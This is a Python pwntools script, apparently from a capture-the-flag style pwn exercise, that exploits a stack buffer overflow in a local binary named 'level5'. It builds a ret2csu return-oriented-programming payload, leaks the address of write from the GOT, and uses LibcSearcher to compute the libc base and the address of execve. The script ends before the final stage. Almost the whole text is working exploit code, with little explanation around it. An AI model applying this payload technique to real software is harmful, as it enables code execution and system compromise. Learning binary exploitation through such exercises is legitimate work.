from pwn import *
from LibcSearcher import LibcSearcher

def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13, r14, r15, last):
    # This function assumes that the 'csu_gadget_addr' pops the values into the registers
    # and then calls the function pointer at 'func_gadget_addr', which will use those register
    # values to perform the operation.

    # Padding to reach the return address, assuming a buffer overflow at 128 bytes
    # plus 8 bytes for the saved RBP (this may need to be adjusted for your specific binary)
    buf_size = 128 + 8
    payload = b"A" * buf_size

    # Add the CSU gadget address
    payload += p64(csu_gadget_addr)

    # Values to be popped into registers by the CSU gadget
    payload += p64(rbx)   # rbx value to be popped into rbx register
    payload += p64(rbp)   # rbp value to be popped into rbp register
    payload += p64(r12)   # r12 value to be popped into r12 register (will be used in the call)
    payload += p64(r13)   # r13 value to be popped into rdi register
    payload += p64(r14)   # r14 value to be popped into rsi register
    payload += p64(r15)   # r15 value to be popped into rdx register

    # Add the 'func_gadget_addr' which will call the function at [r12 + rbx*8]
    payload += p64(func_gadget_addr)

    # Extra padding needed between 'func_gadget_addr' and the 'last' address
    # The exact amount should be determined by the specifics of the gadgets used
    # This often includes padding for any additional pops that may occur in the gadgets
    # For this example, I am using '7 * 8' to account for 7 potential pops
    # This may need to be adjusted based on the specific gadgets you are using.
    padding_between = 7 * 8  # Adjust this value as needed for your gadgets
    payload += b"B" * padding_between

    # The address to return to after the function call is complete
    payload += p64(last)

    return payload

if __name__ == '__main__':
    l5 = ELF('./level5')

    main = l5.symbols['main']
    print(hex(main))

    # step1: 获取 write 的 GOT 地址
    payload1 = craft_ret2csu_payload(0x0040061a, # gadget csu
                                     0x004005ec, # gadget func
                                     0,          # rbx
                                     1,          # rbp
                                     l5.got["write"],  # r12 write.got
                                     1,          # r13 stdout
                                     l5.got["write"],  # r14 buffer 6278066737626506568
                                     8,          # r15 size
                                     main # ret
                                     )

    sh = process('./level5')

    sh.recvuntil('Hello, World\n')
    sh.send(payload1)
    write_addr = u64(sh.recv(8))

    # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
    print(write_addr)

    # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
    print(sh.recv())

    # step2: 获取 execve 在程序中的真实地址
    libc = LibcSearcher('write' ,write_addr)
    libc_base = write_addr - libc.dump('write')
    execve_addr = libc_base + libc.dump('execve')
    log.success('execve_addr ' + hex(execve_addr))
